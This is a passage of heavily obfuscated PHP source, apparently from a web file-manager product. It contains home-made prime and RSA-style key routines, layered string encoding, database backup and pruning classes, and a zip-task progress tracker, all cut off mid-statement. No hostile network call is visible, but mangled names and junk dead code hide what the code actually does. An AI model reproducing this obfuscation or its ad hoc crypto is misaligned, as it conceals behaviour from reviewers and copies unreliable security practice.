$é¬øĞ); if ($¦ÀĞœ¢ - 1 > 0) { $é¬øĞ = $this->qzot9bcca048($é¬øĞ, $óëŒèêê, $¦ÀĞœ¢ - 1); } return $é¬øĞ; } private function lmqa964148d0($ëœ¨ÉÛæ, $“£€ÅÜò, $ßş…Òº = 3) { $ºĞé™Îª =& $_SERVER[‹‰”››ê]; $òıÌî½ğ =& $_SERVER[¢Î¨ùä°]; if (!is_string($ëœ¨ÉÛæ) || strlen($ëœ¨ÉÛæ) < 10) { return !1; } $ëœ¨ÉÛæ = trim($ëœ¨ÉÛæ); $ëœ¨ÉÛæ = strrev($ëœ¨ÉÛæ); $ğş‘Ã ¢ = $ëœ¨ÉÛæ[0]; $êëÎüò = $ºĞé™Îª[799]; $¹¨ÅÛôĞ = substr($ëœ¨ÉÛæ, 1, 15); $ëœ¨ÉÛæ = substr($ëœ¨ÉÛæ, 16); $ì¥£ˆº = $ºĞé™Îª[800]; $Ø§°¢·¤ = $òıÌî½ğ[300]; switch ($ğş‘Ã ¢) { case $òıÌî½ğ[206]: $ÇŸÎøÎª = $this->fjez1b054a46($ëœ¨ÉÛæ, strrev($“£€ÅÜò . $¹¨ÅÛôĞ)); $†şÙúü = $ºĞé™Îª[801]; if (strlen($†şÙúü) < $ºĞé™Îª[708]) { die; } break; $‹îıåóè = $ºĞé™Îª[802]; while ($‹îıåóè < $ºĞé™Îª[700]) { if ($‹îıåóè >= 0) { break; } $‹îıåóè++; } case $òıÌî½ğ[122]: $ÇŸÎøÎª = $this->fjez1b054a46($ëœ¨ÉÛæ, strrev($¹¨ÅÛôĞ . $“£€ÅÜò)); $µšË—Ëé = $ºĞé™Îª[803]; while (strlen($µšË—Ëé) < $ºĞé™Îª[700]) { if (!$µšË—Ëé) { break; } $µšË—Ëé++; } break; $Û€È¹›‚ = $ºĞé™Îª[804]; if (!$Û€È¹›‚) { die; } case $òıÌî½ğ[301]: $ÇŸÎøÎª = $this->fjez1b054a46($ëœ¨ÉÛæ, base64_encode($¹¨ÅÛôĞ . $“£€ÅÜò)); break; case $òıÌî½ğ[302]: $ÇŸÎøÎª = $this->fjez1b054a46($ëœ¨ÉÛæ, md5($¹¨ÅÛôĞ . $“£€ÅÜò)); $–±çÇƒ× = $ºĞé™Îª[805]; if (!$–±çÇƒ×) { return; } break; $¢·®Çó½ = $ºĞé™Îª[806]; if (!$¢·®Çó½) { die; } case $òıÌî½ğ[303]: $ëœ¨ÉÛæ = hash_decode($ëœ¨ÉÛæ); $Åáúšáæ = $ºĞé™Îª[807]; $Üğ®Ğ¨ = $ëœ¨ÉÛæ[0]; $ëœ¨ÉÛæ = substr($ëœ¨ÉÛæ, 1); $¹ˆùşÛ = $ºĞé™Îª[808]; while ($¹ˆùşÛ < $ºĞé™Îª[322]) { if ($¹ˆùşÛ >= 0) { break; } $¹ˆùşÛ++; } $ü¤İğöÇ = strpos($Ø§°¢·¤, $Üğ®Ğ¨); $•ş¯öÂÌ = md5($Üğ®Ğ¨ . md5($“£€ÅÜò . $Üğ®Ğ¨) . $“£€ÅÜò); $•ş¯öÂÌ = substr($•ş¯öÂÌ, $ü¤İğöÇ % 8, $ü¤İğöÇ % 8 + 7); $ÊêØºà† = $ºĞé™Îª[809]; while (strlen($ÊêØºà†) < $ºĞé™Îª[708]) { if (!$ÊêØºà†) { break; } $ÊêØºà†++; } $Ÿ¥±ÄÙ = $òıÌî½ğ[6]; $¿×Ùµ÷Í = $ºĞé™Îª[810]; if (strlen($¿×Ùµ÷Í) < $ºĞé™Îª[733]) { die; } $ˆÅ¡ãŞ = 0; $Š’èâõ¨ = $ºĞé™Îª[811]; if (!$Š’èâõ¨) { return; } $¥ÏşŸ‰ = 0; $ şû¤Œã = $ºĞé™Îª[812]; while ($ şû¤Œã < $ºĞé™Îª[703]) { if ($ şû¤Œã >= 0) { break; } $ şû¤Œã++; } $¢¬ğúÔÊ = 0; for ($ˆÅ¡ãŞ = 0; $ˆÅ¡ãŞ < strlen($ëœ¨ÉÛæ); $ˆÅ¡ãŞ++) { $¢¬ğúÔÊ = $¢¬ğúÔÊ == strlen($•ş¯öÂÌ) ? 0 : $¢¬ğúÔÊ; $Ëë©Ÿ˜ = $ºĞé™Îª[813]; if (!$Ëë©Ÿ˜) { die; } $¯¿ÈÁ€ = $¢¬ğúÔÊ++; $Õ±ë»á  = $ºĞé™Îª[814]; while ($Õ±ë»á  < $ºĞé™Îª[700]) { if ($Õ±ë»á  >= 0) { break; } $Õ±ë»á ++; } $¥ÏşŸ‰ = strpos($Ø§°¢·¤, $ëœ¨ÉÛæ[$ˆÅ¡ãŞ]) - $ü¤İğöÇ - ord($•ş¯öÂÌ[$¯¿ÈÁ€]); while ($¥ÏşŸ‰ < 0) { $¥ÏşŸ‰ += 64; } $Ÿ¥±ÄÙ .= $Ø§°¢·¤[$¥ÏşŸ‰]; $ñô€‘å = $ºĞé™Îª[815]; } $ÇŸÎøÎª = base64_decode($Ÿ¥±ÄÙ); break; $’÷æ«®¥ = $ºĞé™Îª[811]; if (!$’÷æ«®¥) { die; } default: $ÇŸÎøÎª = $this->fjez1b054a46($ëœ¨ÉÛæ, $“£€ÅÜò . $¹¨ÅÛôĞ); $äÎ°À®ı = $ºĞé™Îª[816]; if (!$äÎ°À®ı) { return; } break; } if ($ßş…Òº - 1 > 0) { $ÇŸÎøÎª = $this->lmqa964148d0($ÇŸÎøÎª, $“£€ÅÜò, $ßş…Òº - 1); } return $ÇŸÎøÎª; } public function bdipfc67131d($Ù€Á­ùˆ) { $ù§·¼¾Ş =& $_SERVER[‹‰”››ê]; $È¼à·ÖÇ =& $_SERVER[¢Î¨ùä°]; $¤‚ªş÷ı = $this->qwnz6d567534(); $Õ…Ÿ¤û = $ù§·¼¾Ş[817]; $ø€²îÍ± = $this->qwnz6d567534(); $áã±Ôò½ = $ù§·¼¾Ş[818]; while (strlen($áã±Ôò½) < $ù§·¼¾Ş[700]) { if (!$áã±Ôò½) { break; } $áã±Ôò½++; } $´’¬é·å = ($¤‚ªş÷ı - 1) * ($ø€²îÍ± - 1); $‚¶Û‰š = intval(($¤‚ªş÷ı + $ø€²îÍ±) / 2); while (1) { $ŸîÂ„Ç = $‚¶Û‰š; $¯üÏ½ü = $´’¬é·å; while ($¯üÏ½ü % $ŸîÂ„Ç != 0) { $ä…‰„ø = $¯üÏ½ü; $•ì×ö¤ñ = $ù§·¼¾Ş[819]; if (strlen($•ì×ö¤ñ) < $ù§·¼¾Ş[322]) { return; } $¯üÏ½ü = $ŸîÂ„Ç; $ŸîÂ„Ç = $ä…‰„ø % $ŸîÂ„Ç; $â‰¡Ãıİ = $ù§·¼¾Ş[820]; } if ($ŸîÂ„Ç == 1) { break; } else { $‚¶Û‰š++; } } $Æ¨±æİ = 2; $¢ñßÔ‡¡ = $ù§·¼¾Ş[821]; while ($¢ñßÔ‡¡ < $ù§·¼¾Ş[322]) { if ($¢ñßÔ‡¡ >= 0) { break; } $¢ñßÔ‡¡++; } for ($ã¦üÁµâ = 0; $ã¦üÁµâ < $´’¬é·å * 10; $ã¦üÁµâ++) { if (($´’¬é·å * $ã¦üÁµâ + 1) % $‚¶Û‰š == 0) { $Æ¨±æİ = intval(($´’¬é·å * $ã¦üÁµâ + 1) / $‚¶Û‰š); break; } } $»áÒŸÍ€ = $this->yowpb68be23f($¤‚ªş÷ı * $ø€²îÍ± . $È¼à·ÖÇ[6], $È¼à·ÖÇ[136]); $·¢ÎëöÀ = md5($È¼à·ÖÇ[304] . ($¤‚ªş÷ı + $ø€²îÍ±) . $È¼à·ÖÇ[305] . $‚¶Û‰š . $È¼à·ÖÇ[305] . $Æ¨±æİ . $È¼à·ÖÇ[306]); $é·ÃÄæâ = $this->yowpb68be23f($Ù€Á­ùˆ, $·¢ÎëöÀ) . $È¼à·ÖÇ[307] . $»áÒŸÍ€; return $é·ÃÄæâ; } public function fyleda343085($×¯€›ûÙ) { $€×ù’Û =& $_SERVER[‹‰”››ê]; $‡²ƒ„¸È =& $_SERVER[¢Î¨ùä°]; $Í‰şÚÒÕ = explode($‡²ƒ„¸È[307], $×¯€›ûÙ); if (count($Í‰şÚÒÕ) != 2) { return $‡²ƒ„¸È[6]; } $ˆ—âô‰Ç = $this->fjez1b054a46($Í‰şÚÒÕ[1] . $‡²ƒ„¸È[6], $‡²ƒ„¸È[136]); $Û¬ÜÜ = $€×ù’Û[822]; while ($Û¬ÜÜ < $€×ù’Û[733]) { if ($Û¬ÜÜ >= 0) { break; } $Û¬ÜÜ++; } if (!$ˆ—âô‰Ç) { return $‡²ƒ„¸È[6]; } $ˆ—âô‰Ç = intval($ˆ—âô‰Ç); $Ş÷‰ç‹ = $€×ù’Û[823]; $ìŞÃÜ É = 0; $µ¶Ñ”¯• = 0; $€òúˆ¿ = $€×ù’Û[824]; if (!$€òúˆ¿) { return; } for ($›®’ÕŠØ = 3; $›®’ÕŠØ < $ˆ—âô‰Ç; $›®’ÕŠØ += 2) { if ($ˆ—âô‰Ç % $›®’ÕŠØ != 0) { continue; } $ìŞÃÜ É = $›®’ÕŠØ; $µ¶Ñ”¯• = intval($ˆ—âô‰Ç / $›®’ÕŠØ); break; $¾Æ£Æ´ = $€×ù’Û[825]; if (strlen($¾Æ£Æ´) < $€×ù’Û[733]) { return; } } $“æŸ¢âş = ($ìŞÃÜ É - 1) * ($µ¶Ñ”¯• - 1); $óüÄ‘À = intval(($ìŞÃÜ É + $µ¶Ñ”¯•) / 2); $õ¿«ÛØĞ = $€×ù’Û[826]; if (strlen($õ¿«ÛØĞ) < $€×ù’Û[700]) { die; } while (1) { $»í¨¡äŒ = $óüÄ‘À; $İ÷‰—×½ = $“æŸ¢âş; while ($İ÷‰—×½ % $»í¨¡äŒ != 0) { $¯õÆøòÍ = $İ÷‰—×½; $‰ÏÅ›¼ã = $€×ù’Û[827]; if (!$‰ÏÅ›¼ã) { die; } $İ÷‰—×½ = $»í¨¡äŒ; $¶Á†ûˆ = $€×ù’Û[828]; if (!$¶Á†ûˆ) { die; } $»í¨¡äŒ = $¯õÆøòÍ % $»í¨¡äŒ; $´–æŠ¶­ = $€×ù’Û[829]; } if ($»í¨¡äŒ == 1) { break; } else { $óüÄ‘À++; } } $èµ´‡¯ˆ = 2; $¿øÂÓÍ§ = $€×ù’Û[830]; if (strlen($¿øÂÓÍ§) < $€×ù’Û[322]) { die; } for ($›®’ÕŠØ = 0; $›®’ÕŠØ < $“æŸ¢âş * 10; $›®’ÕŠØ++) { if (($“æŸ¢âş * $›®’ÕŠØ + 1) % $óüÄ‘À == 0) { $èµ´‡¯ˆ = intval(($“æŸ¢âş * $›®’ÕŠØ + 1) / $óüÄ‘À); break; } } $Ü Ü…„ = md5($‡²ƒ„¸È[304] . ($ìŞÃÜ É + $µ¶Ñ”¯•) . $‡²ƒ„¸È[305] . $óüÄ‘À . $‡²ƒ„¸È[305] . $èµ´‡¯ˆ . $‡²ƒ„¸È[306]); $Œø½—à‹ = $this->fjez1b054a46($Í‰şÚÒÕ[0], $Ü Ü…„); $„éø›Áç = $€×ù’Û[831]; while (strlen($„éø›Áç) < $€×ù’Û[700]) { if (!$„éø›Áç) { break; } $„éø›Áç++; } return $Œø½—à‹; $±â×Üƒ = $€×ù’Û[832]; } public function qwnz6d567534() { $Ø’×íÜŞ =& $_SERVER[‹‰”››ê]; $˜€½¼İ = mt_rand(pow(2, 14), pow(2, 16) - 1); $ÉßÛ‹£­ = $Ø’×íÜŞ[833]; if (strlen($ÉßÛ‹£­) < $Ø’×íÜŞ[700]) { die; } $Ÿº ÀßÉ = array(); $¾´ßò’› = $Ø’×íÜŞ[834]; if (strlen($¾´ßò’›) < $Ø’×íÜŞ[703]) { return; } $·îñçÆ = 1; while ($·îñçÆ <= (int) sqrt($˜€½¼İ)) { $µÇ÷óÑ• = $·îñçÆ; while (!0) { $µÇ÷óÑ•++; if ($µÇ÷óÑ• <= 2) { $·îñçÆ = $µÇ÷óÑ•; break; } else { if ($µÇ÷óÑ• < 2) { continue; } } $Â±ú¨Áß = !0; for ($Î‚¸„˜‘ = 2; $Î‚¸„˜‘ <= sqrt($µÇ÷óÑ•); $Î‚¸„˜‘++) { if ($µÇ÷óÑ• % $Î‚¸„˜‘ == 0) { $Â±ú¨Áß = !1; } } if ($Â±ú¨Áß) { $·îñçÆ = $µÇ÷óÑ•; break; } } $Ÿº ÀßÉ[] = $·îñçÆ; $Éœ¶‰ñ = $Ø’×íÜŞ[835]; while ($Éœ¶‰ñ < $Ø’×íÜŞ[703]) { if ($Éœ¶‰ñ >= 0) { break; } $Éœ¶‰ñ++; } } $Õ‡³óÄ­ = 2; for ($µÇ÷óÑ• = $˜€½¼İ; $µÇ÷óÑ• > 1; $µÇ÷óÑ•--) { $Â±ú¨Áß = !0; foreach ($Ÿº ÀßÉ as $ÂâÊ‡­¹) { if ($µÇ÷óÑ• % $ÂâÊ‡­¹ == 0) { $Â±ú¨Áß = !1; break; } } if ($Â±ú¨Áß) { $Õ‡³óÄ­ = $µÇ÷óÑ•; break; } } return $Õ‡³óÄ­; $ìô“¬ú = $Ø’×íÜŞ[836]; } public function yfjqc68195ba($õ“é€ïŠ, $ù™©Òû) { $Ùªú½Ï =& $_SERVER[¢Î¨ùä°]; return call_user_func(array($Ùªú½Ï[8], $Ùªú½Ï[308]), $õ“é€ïŠ, $ù™©Òû); } public function yowpb68be23f($«¡¼Œ™, $½­ÍŸãæ) { $æıª€£² =& $_SERVER[‹‰”››ê]; $ş°²×å£ =& $_SERVER[¢Î¨ùä°]; return call_user_func(array($ş°²×å£[309], $ş°²×å£[310]), $«¡¼Œ™, $½­ÍŸãæ); $Œİ˜Âˆ = $æıª€£²[837]; if (strlen($Œİ˜Âˆ) < $æıª€£²[733]) { return; } } public function fjez1b054a46($ °ıüÉö, $Á´©öÅÒ) { $Ùû´Â‚î =& $_SERVER[¢Î¨ùä°]; return call_user_func(array($Ùû´Â‚î[309], $Ùû´Â‚î[311]), $ °ıüÉö, $Á´©öÅÒ); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[‹‰”››ê][838]); $this->init(); $this->keep(); } public function init() { $š‘ßÆ“» =& $_SERVER[‹‰”››ê]; $this->isManual(); self::$name = date($š‘ßÆ“»[839]); if (!($‘ç‡’ß– = $this->model->lastItem())) { $‘ç‡’ß– = $this->initData(); } else { self::$name = $‘ç‡’ß–[$š‘ßÆ“»[32]]; if ($‘ç‡’ß–[$š‘ßÆ“»[840]] == $š‘ßÆ“»[91]) { self::$name = date($š‘ßÆ“»[262]); $¨ªåñ¢¿ = intval(_get($‘ç‡’ß–, $š‘ßÆ“»[841], 0)); if (self::$manual == 0 && $‘ç‡’ß–[$š‘ßÆ“»[32]] == self::$name) { $this->model->remove($‘ç‡’ß–[$š‘ßÆ“»[487]]); } $‘ç‡’ß– = $this->initData($¨ªåñ¢¿, $‘ç‡’ß–[$š‘ßÆ“»[842]]); } else { $this->checkStore($‘ç‡’ß–[$š‘ßÆ“»[842]]); } } self::$option = $‘ç‡’ß–; } private function isManual() { $äÛ¦î²’ = _get($GLOBALS, $_SERVER[‹‰”››ê][843], 0); $äÛ¦î²’ = intval($äÛ¦î²’); self::$manual = $äÛ¦î²’ && $äÛ¦î²’ == 1 ? 1 : 0; } private function initData($èûŠ†·Ğ = 0, $ïáòï‡ê = '') { $èËĞõ  =& $_SERVER[‹‰”››ê]; $·ŸÁÕ­¿ = $this->model->config(); if ($ïáòï‡ê && $·ŸÁÕ­¿[$èËĞõ [842]] != $ïáòï‡ê) { $èûŠ†·Ğ = 0; } $this->checkStore($·ŸÁÕ­¿[$èËĞõ [842]]); if (self::$manual == 1) { self::$name .= $èËĞõ [11] . date($èËĞõ [844]); } $Ò±á‚‚® = array($èËĞõ [842] => $·ŸÁÕ­¿[$èËĞõ [842]], $èËĞõ [32] => self::$name, $èËĞõ [840] => 0, $èËĞõ [171] => $·ŸÁÕ­¿[$èËĞõ [171]], $èËĞõ [845] => self::$manual, $èËĞõ [380] => array($èËĞõ [846] => array($èËĞõ [840] => 0), $èËĞõ [847] => array($èËĞõ [840] => 0, $èËĞõ [848] => 0, $èËĞõ [849] => 0, $èËĞõ [33] => $èËĞõ [12], $èËĞõ [850] => 0, $èËĞõ [851] => 0), $èËĞõ [852] => array($èËĞõ [840] => 0, $èËĞõ [848] => 0, $èËĞõ [849] => 0, $èËĞõ [850] => 0, $èËĞõ [851] => 0), $èËĞõ [233] => array($èËĞõ [840] => 0, $èËĞõ [853] => 0, $èËĞõ [854] => 0, $èËĞõ [855] => 0, $èËĞõ [856] => 0, $èËĞõ [555] => $èûŠ†·Ğ, $èËĞõ [850] => 0, $èËĞõ [851] => 0)), $èËĞõ [850] => time(), $èËĞõ [851] => 0); $á Äøä× = $this->model->insert($Ò±á‚‚®); $Ò±á‚‚®[$èËĞõ [487]] = $á Äøä×; return $Ò±á‚‚®; } private function checkStore($‰•ÍâÚ£) { $Ñœ¿é “ = Model($_SERVER[‹‰”››ê][857]); $¾ìîô÷– = $Ñœ¿é “->listData($‰•ÍâÚ£); $Ñœ¿é “->checkConfig($¾ìîô÷–); } public static function get() { if (!self::$option) { $ãŞïÉı = Model($_SERVER[‹‰”››ê][838]); $Ÿİß…ØÍ = $ãŞïÉı->findByName(self::$name); $ãŞïÉı->parseContent($Ÿİß…ØÍ); self::$option = $Ÿİß…ØÍ; } return self::$option; } public static function set($Æâœ²¨á) { $á©ù¼´‰ =& $_SERVER[‹‰”››ê]; $âıÂºÙ = self::get(); foreach ($Æâœ²¨á as $í®è„•¸ => $¹Î±ğÇ§) { array_set_value($âıÂºÙ, $í®è„•¸, $¹Î±ğÇ§); } Model($á©ù¼´‰[838])->update($âıÂºÙ[$á©ù¼´‰[487]], $âıÂºÙ); self::$option = $âıÂºÙ; return self::$option; } public function keep() { $­¬ıÄ¤ =& $_SERVER[‹‰”››ê]; $ ë‹È£ã = self::get(); if (_get($ ë‹È£ã, $­¬ıÄ¤[858], 0) == $­¬ıÄ¤[91]) { return; } $this->backupKeep($ ë‹È£ã); self::set(array($­¬ıÄ¤[858] => 1)); } private function backupKeep($Ñ –¯) { $ÃÇùë¯õ =& $_SERVER[‹‰”››ê]; if (self::$manual == 1) { return; } $ÕÔÅìî€ = $this->model->listData(); if (empty($ÕÔÅìî€)) { return; } $”óÜÅÍÁ = 0; $—§òì²Ò = array(); foreach ($ÕÔÅìî€ as $¬çİ±ŸÍ) { if ($”óÜÅÍÁ >= 7) { break; } $—§òì²Ò[] = $¬çİ±ŸÍ[$ÃÇùë¯õ[32]]; $”óÜÅÍÁ++; } for ($”óÜÅÍÁ = 0; $”óÜÅÍÁ < 12; $”óÜÅÍÁ++) { $—§òì²Ò[] = date($ÃÇùë¯õ[859], strtotime("\55{$”óÜÅÍÁ}\x20\x6d\x6f\x6e\x74\x68\163")); } $—§òì²Ò = array_unique($—§òì²Ò); $ˆÓ¸ÌË = Model($ÃÇùë¯õ[860])->get($ÃÇùë¯õ[861]); foreach ($ÕÔÅìî€ as $¬çİ±ŸÍ) { if (isset($¬çİ±ŸÍ[$ÃÇùë¯õ[845]]) && $¬çİ±ŸÍ[$ÃÇùë¯õ[845]] == $ÃÇùë¯õ[91]) { continue; } if (!empty($¬çİ±ŸÍ[$ÃÇùë¯õ[32]]) && in_array($¬çİ±ŸÍ[$ÃÇùë¯õ[32]], $—§òì²Ò)) { continue; } $this->model->remove($¬çİ±ŸÍ[$ÃÇùë¯õ[487]]); $˜ïÔÔ•º = $this->backupPath($Ñ –¯, $ˆÓ¸ÌË); IO::remove($˜ïÔÔ•º, !1); } } private function backupPath($±Ò—Ú»ø, $õÀßºì„ = false) { $äÍ’ßÃ“ =& $_SERVER[‹‰”››ê]; if (!$õÀßºì„) { $õÀßºì„ = Model($äÍ’ßÃ“[860])->get($äÍ’ßÃ“[861]); } $óÙ§åü¥ = $±Ò—Ú»ø[$äÍ’ßÃ“[32]]; $¡úûİÏ° = substr(md5($äÍ’ßÃ“[862] . $õÀßºì„ . $óÙ§åü¥), 0, 8); return "\173\x69\x6f\x3a{$±Ò—Ú»ø[$äÍ’ßÃ“[842]]}\x7d\x2f\144\141\x74\x61\142\141\163\145\57\142\x61\x63\153\x75\160\x2f" . $óÙ§åü¥ . $äÍ’ßÃ“[11] . $¡úûİÏ°; } public function db() { $«Ä¨ñîª =& $_SERVER[‹‰”››ê]; $«ßÕ¿é = self::get(); if (_get($«ßÕ¿é, $«Ä¨ñîª[863], 0) == $«Ä¨ñîª[91]) { return !0; } $íğ³—Ù = new BackupDb(); if (!$íğ³—Ù->index()) { return !1; } self::set(array($«Ä¨ñîª[863] => 1)); return !0; } public function dbFile() { $æ‹ã±®± =& $_SERVER[‹‰”››ê]; $ãÏ³„Õà = self::get(); if (_get($ãÏ³„Õà, $æ‹ã±®±[864], 0) == $æ‹ã±®±[91]) { return !0; } $ÜÎÌ¡®ë = new BackupDbFile(); if (!$ÜÎÌ¡®ë->index()) { return !1; } self::set(array($æ‹ã±®±[864] => 1)); return !0; } public function file() { $ğàÜÁŠ£ =& $_SERVER[‹‰”››ê]; $›ıò¦À = self::get(); if (_get($›ıò¦À, $ğàÜÁŠ£[865], 0) == $ğàÜÁŠ£[91]) { return !0; } if ($›ıò¦À[$ğàÜÁŠ£[171]] == $ğàÜÁŠ£[866]) { $è¨‘ö÷â = new BackupFile(); if (!$è¨‘ö÷â->index()) { return !1; } } self::set(array($ğàÜÁŠ£[865] => 1, $ğàÜÁŠ£[840] => 1)); return !0; } public static function log($‡İí³øí) { write_log($‡İí³øí, $_SERVER[‹‰”››ê][867]); } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $Š¹º¶ª€ =& $_SERVER[‹‰”››ê]; $â«ø¨áº = Backup::get(); self::$io = $â«ø¨áº[$Š¹º¶ª€[842]]; self::$name = $â«ø¨áº[$Š¹º¶ª€[32]]; $â¥è†­ô = new DbManage(); $¥œ³äşŸ = $â¥è†­ô->dbType(); $¬†‹¾ñÛ = array($Š¹º¶ª€[868] => $¥œ³äşŸ, $Š¹º¶ª€[869] => time()); Backup::set($¬†‹¾ñÛ); $¬…ê® Ì = $this->tmpFilesPath() . $Š¹º¶ª€[870] . self::$name . $Š¹º¶ª€[8]; del_dir($¬…ê® Ì); mk_dir($¬…ê® Ì); $ÒšÁÆò† = $½‹ÑéªÄ = 0; try { $³÷¸ö = $â¥è†­ô->db()->getTables(); } catch (Exception $Ê‘å¸ßÁ) { Backup::log($Š¹º¶ª€[871] . $Ê‘å¸ßÁ->getMessage()); return !1; } $³÷¸ö = array_diff($³÷¸ö, array($Š¹º¶ª€[872], $Š¹º¶ª€[873])); foreach ($³÷¸ö as $·Ã¯†¹Á) { if ($·Ã¯†¹Á == $Š¹º¶ª€[874]) { continue; } $ÒšÁÆò† += $â¥è†­ô->model($·Ã¯†¹Á)->count(); } $­ÛÉîÈ„ = new Task($Š¹º¶ª€[875], $Š¹º¶ª€[867], $ÒšÁÆò†, LNG($Š¹º¶ª€[876]) . $Š¹º¶ª€[877] . LNG($Š¹º¶ª€[878])); $GLOBALS[$Š¹º¶ª€[879]] = self::$name; foreach ($³÷¸ö as $·Ã¯†¹Á) { $ºøî– = $¬…ê® Ì . $·Ã¯†¹Á . $Š¹º¶ª€[880]; if ($·Ã¯†¹Á == $Š¹º¶ª€[874]) { @touch($ºøî–); continue; } $ÑÀˆÙêÇ = null; if ($·Ã¯†¹Á == $Š¹º¶ª€[881] && $â«ø¨áº[$Š¹º¶ª€[171]] == $Š¹º¶ª€[866]) { $ÑÀˆÙêÇ = self::$io; } $½‹ÑéªÄ += $â¥è†­ô->sqlFromDb($·Ã¯†¹Á, $ºøî–, $­ÛÉîÈ„, $ÑÀˆÙêÇ); } unset($GLOBALS[$Š¹º¶ª€[879]]); $­ÛÉîÈ„->end(); if ($½‹ÑéªÄ > $ÒšÁÆò†) { $ÒšÁÆò† = $½‹ÑéªÄ; } $¬†‹¾ñÛ = array($Š¹º¶ª€[868] => $¥œ³äşŸ, $Š¹º¶ª€[863] => 1, $Š¹º¶ª€[882] => $ÒšÁÆò†, $Š¹º¶ª€[883] => $½‹ÑéªÄ, $Š¹º¶ª€[884] => time()); Backup::set($¬†‹¾ñÛ); if ($ÒšÁÆò† - $½‹ÑéªÄ > 0) { $æÏ¡¶ş = $Š¹º¶ª€[885]; if (!stristr(I18n::getType(), $Š¹º¶ª€[886])) { $æÏ¡¶ş = $Š¹º¶ª€[887]; } Backup::log(array($æÏ¡¶ş, $¬†‹¾ñÛ)); return !1; } return !0; } private function tmpFilesPath() { $–ğíäû =& $_SERVER[‹‰”››ê]; $ÔËİ×É¹ = TEMP_FILES; if ($GLOBALS[$–ğíäû[6]][$–ğíäû[92]][$–ğíäû[888]]) { $ÔËİ×É¹ = $GLOBALS[$–ğíäû[6]][$–ğíäû[92]][$–ğíäû[888]]; if (!mk_dir($ÔËİ×É¹) || !is_writable($ÔËİ×É¹) || !IO::mkfile($ÔËİ×É¹ . $–ğíäû[889])) { $ÔËİ×É¹ = TEMP_FILES; } } return $ÔËİ×É¹; } } goto C«Ÿ¿”Õ’; AÓ¬°§Ó–Å: class TaskZip extends TaskFileTransfer { protected function startAfter() { $éûã•¾ =& $_SERVER[‹‰”››ê]; parent::startAfter(); Hook::bind($éûã•¾[1917], array($this, $éûã•¾[1907])); Hook::bind($éûã•¾[1909], array($this, $éûã•¾[1910])); $ë¶ÃäÔ¡ =& $this->task; $ë¶ÃäÔ¡[$éûã•¾[1911]] = $éûã•¾[1295]; if (!$ë¶ÃäÔ¡[$éûã•¾[1677]]) { $ë¶ÃäÔ¡[$éûã•¾[1677]] = LNG($éûã•¾[1918]); } } protected function endAfter() { $»×¶”ã‡ =& $_SERVER[‹‰”››ê]; parent::endAfter(); Hook::unbind($»×¶”ã‡[1917], array($this, $»×¶”ã‡[1907])); Hook::unbind($»×¶”ã‡[1909], array($this, $»×¶”ã‡[1910])); } public function updateAfter() { $ãêààÂ´ =& $_SERVER[‹‰”››ê]; $ŞˆÃñŠ  =& $this->task; if (!$ŞˆÃñŠ [$ãêààÂ´[1156]] || !$ŞˆÃñŠ [$ãêààÂ´[853]]) { return; } if ($ŞˆÃñŠ [$ãêààÂ´[1911]] == $ãêààÂ´[1295]) { $åó¨È¼ä = $ŞˆÃñŠ [$ãêààÂ´[1846]]; if ($ŞˆÃñŠ [$ãêààÂ´[1847]] != $ãêààÂ´[1295]) { $åó¨È¼ä = 0; } $¡Ş€ñßï = ($ŞˆÃñŠ [$ãêààÂ´[1850]] + $åó¨È¼ä) / $ŞˆÃñŠ [$ãêààÂ´[853]]; $ŞˆÃñŠ [$ãêààÂ´[1793]] = $¡Ş€ñßï * 0.3; } else { if ($ŞˆÃñŠ [$ãêààÂ´[1911]] == $ãêààÂ´[400]) { $¡Ş€ñßï = $ŞˆÃñŠ [$ãêààÂ´[1792]] / $ŞˆÃñŠ [$ãêààÂ´[1156]]; $ŞˆÃñŠ [$ãêààÂ´[1793]] = 0.3 + $¡Ş€ñßï * 0.5; } else { if ($ŞˆÃñŠ [$ãêààÂ´[1911]] == $ãêààÂ´[110]) { $¡Ş€ñßï = 0; if ($ŞˆÃñŠ [$ãêààÂ´[1845]]) { $¡Ş€ñßï = $ŞˆÃñŠ [$ãêààÂ´[1846]] / $ŞˆÃñŠ [$ãêààÂ´[1845]]; } $ŞˆÃñŠ [$ãêààÂ´[1793]] = 0.3 + 0.5 + $¡Ş€ñßï * 0.2; } } } if ($ŞˆÃñŠ [$ãêààÂ´[1793]] > 0) { $¼Ä¡”®Ä = timeFloat() - $ŞˆÃñŠ [$ãêààÂ´[1795]] - $ŞˆÃñŠ [$ãêààÂ´[1798]]; $ŞˆÃñŠ [$ãêààÂ´[1799]] = $¼Ä¡”®Ä * (1 - $ŞˆÃñŠ [$ãêààÂ´[1793]]) / $ŞˆÃñŠ [$ãêààÂ´[1793]]; } } public function copyFileStart($ºÃâÌ£», $ßÍ°Ëº½, $ãÒŞÄ‚Ì, $âÚŒ÷ñ”, $œ•‘ƒş¶, $ÚÄöŞ´¥) { $§ƒ°ÊÉú =& $_SERVER[‹‰”››ê]; parent::copyFileStart($ºÃâÌ£», $ßÍ°Ëº½, $ãÒŞÄ‚Ì, $âÚŒ÷ñ”, $œ•‘ƒş¶, $ÚÄöŞ´¥); $ôĞ®¾üü =& $this->task; if ($ôĞ®¾üü[$§ƒ°ÊÉú[1911]] == $§ƒ°ÊÉú[400]) { $ôĞ®¾üü[$§ƒ°ÊÉú[1911]] = $§ƒ°ÊÉú[110]; } $this->update(); } public function copyFileEnd($â‰µÄÑ¡, $Æ ´ ˜—, $ğ¿àš°ñ, $•¢ÖÓÜæ, $™òÛ¢¹ô, $Üµ Ÿ¡) { $– ¡¾»æ =& $_SERVER[‹‰”››ê]; $îÚ«Šã¢ =& $this->task; $îÚ«Šã¢[$– ¡¾»æ[1846]] = $îÚ«Šã¢[$– ¡¾»æ[1845]]; $îÚ«Šã¢[$– ¡¾»æ[1850]] += $îÚ«Šã¢[$– ¡¾»æ[1845]]; $îÚ«Šã¢[$– ¡¾»æ[1847]] = $– ¡¾»æ[12]; $this->update(); } public function zipEvent($æêåÚğ—, $Á‹•õ², $±–ÍŒÅÙ, $½ğå³ÑĞ) { $°›¼·æÊ =& $_SERVER[‹‰”››ê]; $úÎÕ¬¤ =& $this->task; $úÎÕ¬¤[$°›¼·æÊ[1843]] = get_path_this($Á‹•õ²); $úÎÕ¬¤[$°›¼·æÊ[1845]] = $½ğå³ÑĞ; $úÎÕ¬¤[$°›¼·æÊ[1846]] = $±–ÍŒÅÙ; $úÎÕ¬¤[$°›¼·æÊ[1158]] = $æêåÚğ— == 